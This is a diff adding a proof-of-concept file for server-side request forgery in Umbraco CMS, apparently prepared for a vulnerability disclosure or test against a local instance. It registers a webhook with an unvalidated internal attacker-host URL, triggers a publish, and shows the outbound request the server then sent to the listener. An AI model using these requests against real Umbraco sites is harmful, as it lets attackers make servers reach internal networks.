@@ -1,0 +1,21 @@
+### The webhook registration (as a Settings-section user) — no URL validation
+POST http://localhost:29184/umbraco/management/api/v1/webhook HTTP/1.1
+Authorization: Bearer <settings-user-token>
+Content-Type: application/json
+
+{"url": "http://172.18.0.1:57221/canary-e7adad984b76", "enabled": true, "events": ["Umbraco.ContentPublish"], "headers": {"X-Canary": "e7adad984b76", "X-Attacker": "ssrf"}, "name": "ssrf-open-e7adad984b76"}
+
+### Trigger
+PUT http://localhost:29184/umbraco/management/api/v1/document/965aba95-646c-4120-8868-5c7553e98980/publish HTTP/1.1
+Authorization: Bearer <admin-token>
+
+{"publishSchedules":[{"culture":null,"schedule":null}]}
+
+### The request the SERVER then originated to our attacker host (captured by the listener):
+POST /canary-e7adad984b76 HTTP/1.1
+Host: 172.18.0.1:57221
+User-Agent: Umbraco-Cms/18.3.0-rc.preview.34
+Umb-Webhook-Event: Umbraco.ContentPublish
+X-Canary: e7adad984b76
+
+{"id":"965aba95-646c-4120-8868-5c7553e98980","cultures":[]}
